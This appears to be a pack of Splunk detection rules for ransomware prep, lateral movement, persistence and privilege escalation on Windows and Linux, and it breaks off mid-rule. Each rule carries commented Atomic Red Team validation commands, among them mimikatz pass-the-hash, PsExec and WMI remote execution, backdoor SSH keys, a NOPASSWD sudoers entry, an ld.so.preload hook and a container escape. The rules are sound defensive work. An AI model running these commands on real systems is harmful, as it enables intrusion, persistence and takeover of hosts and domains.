# source: rules/impact/ransomware-shadowcopy-deletion.yml

[Tyrian - Database and Backup Services Stopped En Masse]
description = Detects bulk service stops targeting databases, mail and backup agents. Ransomware does this to unlock files held open by those services so they can be encrypted too.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (((CommandLine="*net stop *" OR CommandLine="*sc stop *" OR CommandLine="*Stop-Service*")) AND ((CommandLine="*sql*" OR CommandLine="*veeam*" OR CommandLine="*backup*" OR CommandLine="*exchange*" OR CommandLine="*vss*" OR CommandLine="*msexchange*"))) | bucket _time span=5m | stats count as hits by _time,host | where hits >= 3
# severity: critical   techniques: T1489   status: stable
# validate: Atomic Red Team T1489
#   net stop MSSQLSERVER /y
#   net stop VeeamBackupSvc /y
# source: rules/impact/service-stop-before-encryption.yml

[Tyrian - Office Application Spawns a Script Interpreter]
description = Detects the process lineage created by malicious document macros: an Office app (Word, Excel, PowerPoint, Outlook) spawning a script host (PowerShell, cmd, wscript, mshta, rundll32). Reliable initial-access signal for phishing.
search = index=*  ((ParentImage="*\winword.exe" OR ParentImage="*\excel.exe" OR ParentImage="*\powerpnt.exe" OR ParentImage="*\outlook.exe") AND (Image="*\powershell.exe" OR Image="*\cmd.exe" OR Image="*\wscript.exe" OR Image="*\cscript.exe" OR Image="*\mshta.exe" OR Image="*\rundll32.exe"))
# severity: high   techniques: T1566.001,T1059   status: stable
# validate: Atomic Red Team T1566.001
#   Open a macro-enabled document whose AutoOpen runs Shell("cmd.exe /c ..."),
#   so WINWORD.EXE becomes the parent of cmd.exe.
# source: rules/initial-access/office-spawns-script-host.yml

[Tyrian - Lateral Execution via DCOM Object]
description = Detects code launched through DCOM application objects such as MMC20.Application or ShellWindows, a quieter alternative to PsExec that leaves no service-creation artifact behind.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" ((((ParentImage="*\\mmc.exe" OR ParentImage="*\\dllhost.exe")) AND ((Image="*\\cmd.exe" OR Image="*\\powershell.exe" OR Image="*\\mshta.exe"))) AND ((ParentCommandLine="*-Embedding*" OR ParentCommandLine="*MMC20*")))
# severity: high   techniques: T1021.003   status: stable
# validate: Atomic Red Team T1021.003
#   $c=[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','<host>'))
#   $c.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c calc','7')
# source: rules/lateral-movement/dcom-lateral-execution.yml

[Tyrian - Pass-the-Hash via NTLM Network Logon]
description = Detects potential Pass-the-Hash by flagging NTLM network logons (Event ID 4624, Logon Type 3) for interactive-style accounts. Noisy on its own (legacy NTLM apps); correlate with a preceding LSASS-access alert for high confidence.
search = index=* source="WinEventLog:Security" ((((EventID="4624") AND (LogonType="3") AND (AuthenticationPackageName="NTLM") AND (LogonProcessName="NtLmSsp")) AND NOT ((TargetUserName="ANONYMOUS LOGON"))) AND NOT ((TargetUserName="*$")))
# severity: medium   techniques: T1550.002   status: experimental
# validate: Atomic Red Team T1550.002
#   mimikatz.exe "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe"
# source: rules/lateral-movement/pass-the-hash-ntlm.yml

[Tyrian - PsExec-style Remote Service Installation]
description = Detects PsExec / smbexec style lateral movement by flagging service installs (Event ID 7045) with random service names or image paths in admin shares and temp.
search = index=* source="WinEventLog:System" (((EventID="7045")) AND (((match(ServiceName, "^[A-Za-z0-9]{8}$"))) OR ((ImagePath="*\ADMIN$\*" OR ImagePath="*\PSEXESVC*" OR ImagePath="*\Windows\Temp\*" OR ImagePath="*-s cmd*"))))
# severity: high   techniques: T1021.002   status: stable
# validate: Atomic Red Team T1021.002
#   PsExec.exe \\<host> -accepteula cmd.exe
# source: rules/lateral-movement/psexec-service-creation.yml

[Tyrian - Write to an Administrative Share]
description = Detects file writes to the hidden administrative shares, which is the staging half of PsExec-style lateral movement: drop the payload over SMB, then start it as a service on the target.
search = index=* source="WinEventLog:Security" (((EventID="5145") AND (ObjectName="*ADMIN$*" OR ObjectName="*C$*")) AND NOT ((SubjectUserName="*$")))
# severity: high   techniques: T1021.002   status: stable
# validate: Atomic Red Team T1021.002
#   copy payload.exe \\<host>\C$\Windows\Temp\payload.exe
# source: rules/lateral-movement/smb-admin-share-write.yml

[Tyrian - Remote Code Execution via WinRM and PowerShell Remoting]
description = Detects child processes of the WinRM host, which is how Enter-PSSession and Invoke-Command land code on a remote machine. Expect noise wherever fleets are managed with PSRemoting; pair this with an allowlist of admin source hosts.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" ((ParentImage="*\\wsmprovhost.exe"))
# severity: medium   techniques: T1021.006   status: experimental
# validate: Atomic Red Team T1021.006
#   Invoke-Command -ComputerName <host> -ScriptBlock { whoami }
# source: rules/lateral-movement/winrm-remoting-child-process.yml

[Tyrian - Remote Process Creation via WMI]
description = Detects processes spawned by the WMI provider host, which is how wmic /node and Invoke-WmiMethod execute code on a remote machine. Legitimate WMI rarely spawns script interpreters or download utilities.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (((ParentImage="*\\WmiPrvSE.exe")) AND ((Image="*\\powershell.exe" OR Image="*\\pwsh.exe" OR Image="*\\cmd.exe" OR Image="*\\mshta.exe" OR Image="*\\rundll32.exe" OR Image="*\\regsvr32.exe" OR Image="*\\certutil.exe")))
# severity: high   techniques: T1047   status: stable
# validate: Atomic Red Team T1047
#   wmic /node:<host> process call create "cmd.exe /c whoami > C:\Windows\Temp\o.txt"
# source: rules/lateral-movement/wmi-remote-process-creation.yml

[Tyrian - AdminSDHolder Container Modified]
description = Detects a change to the AdminSDHolder object. Its ACL is stamped onto every protected group member (Domain Admins, Enterprise Admins and friends) by the SDProp task roughly every hour, so an entry added here becomes an entry on every privileged account, and re-appears after a defender removes it. It is the closest thing Active Directory has to a self-healing backdoor.
search = index=* source="WinEventLog:Security" ((EventID="5136" OR EventID="4662") AND (ObjectDN="*CN=AdminSDHolder*"))
# severity: critical   techniques: T1098,T1222.001   status: experimental
# validate: Atomic Red Team T1098
#   dsacls "CN=AdminSDHolder,CN=System,DC=tyrian,DC=lab" /G tyrian\attacker:GA
# source: rules/persistence/adminsdholder-acl-modification.yml

[Tyrian - Linux Account Created or Added to a Privileged Group]
description = Detects useradd/adduser execution and usermod adding an account to sudo, wheel, admin or root. Creating a second administrator is how an operator converts a stolen session into an account of their own, one that survives the original credential being reset.
search = index=* sourcetype="auditd" ((((key="tyrian_exec") AND (exe="*/useradd" OR exe="*/adduser")) OR ((key="tyrian_exec") AND (exe="*/usermod" OR exe="*/gpasswd") AND (a2="*sudo*" OR a2="*wheel*" OR a2="*admin*" OR a2="*root*"))) OR ((key="tyrian_passwd")))
# requires the Splunk Add-on for Unix and Linux for auditd field extraction
# severity: high   techniques: T1136.001,T1098   status: experimental
# validate: Atomic Red Team T1136.001
#   useradd -m svcbackup
#   usermod -aG sudo svcbackup
# source: rules/persistence/linux-account-manipulation.yml

[Tyrian - Linux Scheduled Task Persistence via cron]
description = Detects writes to the system cron surfaces: /etc/crontab, the cron.d and cron.<interval> drop-in directories, and the per-user spool. Cron remains the most common Linux persistence mechanism because it is present everywhere and needs no privileges beyond the user's own crontab.
search = index=* sourcetype="auditd" ((key="tyrian_cron"))
# requires the Splunk Add-on for Unix and Linux for auditd field extraction
# severity: high   techniques: T1053.003   status: experimental
# validate: Atomic Red Team T1053.003
#   echo '* * * * * root /dev/shm/beacon' > /etc/cron.d/tyrian-test
#   (crontab -l 2>/dev/null; echo '@reboot /tmp/beacon') | crontab -
# source: rules/persistence/linux-cron-persistence.yml

[Tyrian - Linux Kernel Module Loaded]
description = Detects insmod/modprobe execution and the init_module syscall. A loadable kernel module runs in ring 0, which puts it beyond the reach of every userland control on the host, including the audit daemon that reported it. Module loads are rare and predictable outside of driver updates, so the baseline is small enough to review by hand.
search = index=* sourcetype="auditd" ((key="tyrian_modules"))
# requires the Splunk Add-on for Unix and Linux for auditd field extraction
# severity: medium   techniques: T1547.006   status: experimental
# validate: Atomic Red Team T1547.006
#   modprobe dummy
#   insmod ./tyrian-test.ko
# source: rules/persistence/linux-kernel-module-load.yml

[Tyrian - Linux Shared Library Hijack via ld.so.preload]
description = Detects writes to /etc/ld.so.preload or the ld.so.conf.d directory. A library listed in ld.so.preload is loaded into every dynamically linked process on the host, which is how most Linux userland rootkits hook libc and hide their own files and connections. This file does not exist on a stock system, so its creation is close to a binary indicator.
search = index=* sourcetype="auditd" ((key="tyrian_ldpreload"))
# requires the Splunk Add-on for Unix and Linux for auditd field extraction
# severity: critical   techniques: T1574.006   status: experimental
# validate: Atomic Red Team T1574.006
#   echo /dev/shm/libhook.so > /etc/ld.so.preload
# source: rules/persistence/linux-ld-preload-hijack.yml

[Tyrian - Linux SSH authorized_keys Modified]
description = Detects writes to an authorized_keys file. Appending a public key is the quietest durable backdoor on Linux: it survives reboots and password rotation, needs no malware on disk, and looks like ordinary administration in every log except this one. Pair a hit with "who owns that key".
search = index=* sourcetype="auditd" ((key="tyrian_ssh_keys*") AND (name="*authorized_keys*"))
# requires the Splunk Add-on for Unix and Linux for auditd field extraction
# severity: high   techniques: T1098.004   status: experimental
# validate: Atomic Red Team T1098.004
#   echo 'ssh-ed25519 AAAAC3Nz... attacker@host' >> ~/.ssh/authorized_keys
# source: rules/persistence/linux-ssh-authorized-keys-write.yml

[Tyrian - Linux systemd Unit Created or Modified]
description = Detects writes to systemd unit directories. A unit file gives an attacker root-level execution on every boot with automatic restart, supervised by init itself, which is why it has largely replaced rc.local and init scripts as the Linux persistence of choice.
search = index=* sourcetype="auditd" ((key="tyrian_systemd"))
# requires the Splunk Add-on for Unix and Linux for auditd field extraction
# severity: high   techniques: T1543.002   status: experimental
# validate: Atomic Red Team T1543.002
#   printf '[Service]\nExecStart=/dev/shm/beacon\n[Install]\nWantedBy=multi-user.target\n' \
#   > /etc/systemd/system/tyrian-test.service
#   systemctl daemon-reload
# source: rules/persistence/linux-systemd-service-persistence.yml

[Tyrian - Account Added to a Privileged Local or Domain Group]
description = Detects membership changes to high-value groups. Adding an account to Domain Admins or the local Administrators group is both a common attacker objective and a rare, auditable administrative act.
search = index=* source="WinEventLog:Security" ((EventID="4728" OR EventID="4732" OR EventID="4756"))
# severity: high   techniques: T1098   status: stable
# validate: Atomic Red Team T1136.001
#   net user svcbackup 'Autumn2026!' /add
#   net localgroup administrators svcbackup /add
# source: rules/persistence/new-local-admin-account.yml

[Tyrian - Autorun Persistence via Registry Run Key]
description = Detects writes to the Run and RunOnce keys, the most common persistence location on Windows. Alert value comes from what is written, so review the target value rather than the key itself.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" ((TargetObject="*\\CurrentVersion\\Run\\*" OR TargetObject="*\\CurrentVersion\\RunOnce\\*" OR TargetObject="*\\CurrentVersion\\Policies\\Explorer\\Run\\*"))
# severity: medium   techniques: T1547.001   status: stable
# validate: Atomic Red Team T1547.001
#   reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d C:\Windows\Temp\p.exe /f
# source: rules/persistence/registry-run-key-write.yml

[Tyrian - Service Installed From a Suspicious Path]
description = Detects a new service whose binary lives in a user-writable directory or is launched through an interpreter. Services are a durable, SYSTEM-level foothold and legitimate ones almost never run out of temp.
search = index=* source="WinEventLog:System" (((EventID="7045")) AND ((ServiceFileName="*\\Temp\\*" OR ServiceFileName="*\\Users\\Public\\*" OR ServiceFileName="*\\AppData\\*" OR ServiceFileName="*\\ProgramData\\*" OR ServiceFileName="*powershell*" OR ServiceFileName="*cmd.exe /c*" OR ServiceFileName="*rundll32*")))
# severity: high   techniques: T1543.003   status: stable
# validate: Atomic Red Team T1543.003
#   sc.exe create TyrianTest binPath= C:\Windows\Temp\p.exe start= auto
# source: rules/persistence/service-creation-suspicious-path.yml

[Tyrian - Suspicious Scheduled Task Creation]
description = Detects likely persistence via scheduled tasks by flagging schtasks.exe / at.exe /create where the task action points at a script host, encoded command, or a user-writable path. Task creation is common; the action is what makes it malicious.
search = index=*  (((Image="*\schtasks.exe" OR Image="*\at.exe") AND (CommandLine="*/create*")) AND ((CommandLine="*powershell*" OR CommandLine="*-enc*" OR CommandLine="*AppData*" OR CommandLine="*\Temp\*" OR CommandLine="*rundll32*" OR CommandLine="*mshta*" OR CommandLine="*DownloadString*")))
# severity: high   techniques: T1053.005   status: stable
# validate: Atomic Red Team T1053.005
#   schtasks /create /tn "Updater" /tr "powershell -w hidden -enc <b64>" /sc onlogon /ru SYSTEM
# source: rules/persistence/suspicious-scheduled-task.yml

[Tyrian - WMI Event Subscription Persistence]
description = Detects creation of WMI event filters, consumers and bindings, a fileless persistence mechanism that survives reboot and is invisible to autoruns inspection of the usual locations.
search = index=* source="WinEventLog:Microsoft-Windows-Sysmon/Operational" ((EventID="19" OR EventID="20" OR EventID="21"))
# severity: high   techniques: T1546.003   status: stable
# validate: Atomic Red Team T1546.003
#   Register a __EventFilter + CommandLineEventConsumer pair and bind them with a
#   __FilterToConsumerBinding (Sysmon EID 19/20/21).
# source: rules/persistence/wmi-event-subscription.yml

[Tyrian - Group Policy Object Modified]
description = Detects modification of a groupPolicyContainer object or a write into the SYSVOL Policies share. A GPO is a distribution channel to every machine it links to, so editing one that applies broadly turns a single compromised account into code execution across the estate, delivered by the domain's own tooling.
search = index=* source="WinEventLog:Security" (((EventID="5136") AND (ObjectClass="groupPolicyContainer")) OR ((EventID="5145") AND (ShareName="*SYSVOL*") AND (RelativeTargetName="*Policies*")))
# severity: high   techniques: T1484.001   status: experimental
# validate: Atomic Red Team T1484.001
#   New-GPO -Name TyrianTest | New-GPLink -Target "DC=tyrian,DC=lab"
#   SharpGPOAbuse.exe --AddComputerTask --GPOName "Default Domain Policy" --Command cmd.exe --Arguments "/c whoami"
# source: rules/privilege-escalation/group-policy-object-modified.yml

[Tyrian - Linux Container Escape Attempt]
description = Detects the standard routes out of a container onto its host: nsenter against PID 1's namespaces, a container started with --privileged, and any process handling the Docker socket. A mounted docker.sock is a full host takeover primitive, because whoever can talk to it can start a privileged container.
search = index=* sourcetype="auditd" ((((key="tyrian_exec") AND (exe="*/nsenter") AND (a1="*--target*")) OR ((key="tyrian_exec") AND (a2="*docker.sock*"))) OR ((key="tyrian_exec") AND (exe="*/docker" OR exe="*/podman") AND (a2="*--privileged*")))
# requires the Splunk Add-on for Unix and Linux for auditd field extraction
# severity: critical   techniques: T1611   status: experimental
# validate: Atomic Red Team T1611
#   nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
#   docker run --rm --privileged -v /:/host alpine chroot /host sh
# source: rules/privilege-escalation/linux-container-escape.yml

[Tyrian - Linux sudoers Policy Modified]
description = Detects changes to /etc/sudoers or a drop-in under /etc/sudoers.d. A single NOPASSWD ALL line converts a foothold into permanent root that survives reboots and looks legitimate to anyone not diffing the file. This is a small, high-value surface: alert on every change and reconcile against your change record.
search = index=* sourcetype="auditd" ((key="tyrian_sudoers"))
# requires the Splunk Add-on for Unix and Linux for auditd field extraction
# severity: high   techniques: T1548.003   status: experimental
# validate: Atomic Red Team T1548.003
#   echo 'attacker ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/tyrian-test
# source: rules/privilege-escalation/linux-sudoers-modification.yml

[Tyrian - Resource-Based Constrained Delegation Configured on an Object]
description = Detects a write to msDS-AllowedToActOnBehalfOfOtherIdentity. Whoever controls that attribute on a computer object can tell it to accept S4U requests from an account they own, then impersonate any user to that machine, including a domain administrator. Because a standard user can create computer accounts by default (ms-DS-MachineAccountQuota), RBCD is a routine path from "write access to one object" to "local system on it".
search = index=* source="WinEventLog:Security" ((EventID="5136") AND (AttributeLDAPDisplayName="msDS-AllowedToActOnBehalfOfOtherIdentity"))
# severity: critical   techniques: T1098,T1134.001   status: experimental
# validate: Atomic Red Team T1098
#   Set-ADComputer TARGET$ -PrincipalsAllowedToDelegateToAccount ATTACKER$
#   rbcd.py -delegate-to TARGET$ -delegate-from ATTACKER$ -action write domain/user:pass
# source: rules/privilege-escalation/resource-based-constrained-delegation-write.yml

[Tyrian - Unconstrained or Constrained Delegation Enabled on an Account]
description = Detects delegation being turned on for a user or computer account, via a write to userAccountControl's TRUSTED_FOR_DELEGATION flag or to msDS-AllowedToDelegateTo. A host trusted for unconstrained delegation caches the TGT of every account that authenticates to it, so an attacker who gains it and then coerces a domain controller to connect walks away with the DC's ticket.
search = index=* source="WinEventLog:Security" (((EventID="5136") AND (AttributeLDAPDisplayName="msDS-AllowedToDelegateTo")) OR ((EventID="5136") AND (AttributeLDAPDisplayName="userAccountControl") AND (AttributeValue="*524288*" OR AttributeValue="*16777216*")))
# severity: high   techniques: T1098,T1550.003   status: experimental
